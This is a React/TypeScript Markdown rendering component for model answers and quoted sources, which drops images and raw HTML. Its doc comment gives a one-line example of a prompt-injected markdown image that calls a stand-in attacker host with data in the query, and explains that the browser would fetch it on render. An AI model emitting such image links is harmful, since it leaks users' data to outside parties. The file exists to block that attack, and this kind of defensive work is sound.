import ReactMarkdown from "react-markdown";

/**
 * Renders model answers and quoted sources. Raw HTML is not rendered, and images are dropped
 * (their alt text is kept): a prompt-injected `![](https://attacker/?data)` would otherwise be
 * fetched by the browser as soon as the answer renders.
 */
export function Markdown({ children }: { children: string }) {
  return (
    <ReactMarkdown
      components={{
        img: ({ alt }) => <span>{alt}</span>,
        h1: ({ children }) => <h3 dir="auto" className="mt-3 font-semibold">{children}</h3>,
        h2: ({ children }) => <h3 dir="auto" className="mt-3 font-semibold">{children}</h3>,
        h3: ({ children }) => <h3 dir="auto" className="mt-3 font-semibold">{children}</h3>,
        p: ({ children }) => <p dir="auto" className="leading-7 [&:not(:first-child)]:mt-3">{children}</p>,
        ul: ({ children }) => <ul className="mt-2 list-disc ps-6">{children}</ul>,
        ol: ({ children }) => <ol className="mt-2 list-decimal ps-6">{children}</ol>,
        li: ({ children }) => <li dir="auto">{children}</li>,
        a: ({ href, children }) => (
          <a href={href} target="_blank" rel="noopener noreferrer" className="underline">
            {children}
          </a>
        ),
      }}
    >
      {children}
    </ReactMarkdown>
  );
}
